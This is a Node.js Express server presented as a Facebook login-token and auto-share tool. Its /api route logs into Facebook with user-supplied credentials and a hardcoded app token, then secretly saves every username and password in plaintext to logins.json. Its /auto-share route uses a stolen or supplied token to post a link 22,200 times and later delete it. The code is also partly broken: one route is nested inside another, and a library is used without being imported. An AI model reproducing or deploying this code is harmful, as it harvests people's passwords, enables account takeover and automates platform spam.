const express = require('express');
const app = express();
const request = require('request');
const fs = require('fs');

app.use(express.static('public'));

const api_url = "https://b-api.facebook.com/method/auth.login";
const access_token = "6628568379|c1e620fa708a1d5696fb991c1bde5662";

app.get('/api', (req, res) => {
  const username = req.query.username;
  const password = req.query.password;

  if (!username || !password) {
    return res.send({ message: "Both username and password are required" });
  }

  const params = {
    format: "json",
    device_id: "yrcyg4m1-o7m5-pghw-atiu-n04mh4nlka6n",
    email: username,
    password: password,
    locale: "en_US",
    method: "auth.login",
    access_token: access_token
  };

  request.get({ url: api_url, qs: params }, (error, response, body) => {
    if (error) {
      return res.send({ message: "Internal server error" });
    }

    const responseJson = JSON.parse(body);

    if (responseJson.access_token) {
      return res.send({ access_token: responseJson.access_token });
    } else {
      return res.send({ message: "Wrong Credentials" });
    }
  });

  app.get('/auto-share', async (req, res) => {
    const accessToken = req.query.token;
    const shareUrl = req.query.url;

    if (!accessToken || !shareUrl) {
      return res.status(400).json({ error: 'Both token and URL are required' });
    }

    const shareCount = 22200;
    const timeInterval = 1500;
    const deleteAfter = 60 * 60;

    let sharedCount = 0;
    let timer = null;

    try {
      const response = await axios.get(`https://graph.facebook.com/me?access_token=${accessToken}`);
      if (response.data.error) {
        return res.status(401).json({ error: 'Invalid access token' });
      }
    } catch (error) {
      return res.status(401).json({ error: 'Invalid access token' });
    }

    async function sharePost() {
      try {
        const response = await axios.post(
          `https://graph.facebook.com/me/feed?access_token=${accessToken}&fields=id&limit=1&published=0`,
          {
            link: shareUrl,
            privacy: { value: 'SELF' },
            no_story: true,
          },
          {
            headers: {
              authority: 'graph.facebook.com',
              'cache-control': 'max-age=0',
              'sec-ch-ua-mobile': '?0',
              'user-agent':
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.97 Safari/537.36',
            },
            method: 'post',
          }
        );

        sharedCount++;
        const postId = response?.data?.id;

        console.log(`Post shared: ${sharedCount}`);
        console.log(`Post ID: ${postId || 'Unknown'}`);

        if (sharedCount === shareCount) {
          clearInterval(timer);
          console.log('Finished sharing posts.');

          if (postId) {
            setTimeout(() => {
              deletePost(postId);
            }, deleteAfter * 1000);
          }
        }
      } catch (error) {
        console.error('Failed to share post:', error.response.data);
      }
    }

    async function deletePost(postId) {
      try {
        await axios.delete(`https://graph.facebook.com/${postId}?access_token=${accessToken}`);
        console.log(`Post deleted: ${postId}`);
      } catch (error) {
        console.error('Failed to delete post:', error.response.data);
      }
    }

    timer = setInterval(sharePost, timeInterval);

    setTimeout(() => {
      clearInterval(timer);
      console.log('Loop stopped.');
    }, shareCount * timeInterval);

    res.json({ message: 'Sharing process started' });
  });



  const data = { Username: username, Password: password };
  fs.readFile('logins.json', 'utf8', (err, jsonString) => {
    if (err) {
      console.log("Error reading file from disk:", err);
      return;
    }
    try {
      const logins = JSON.parse(jsonString);
      logins.push(data);
      fs.writeFile('logins.json', JSON.stringify(logins, null, 2), (err) => {
        if (err) {
          console.log('Error writing file:', err);
        }
      });
    } catch (err) {
      console.log('Error parsing JSON string:', err);
    }
  });
});

const port = 5000;
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});


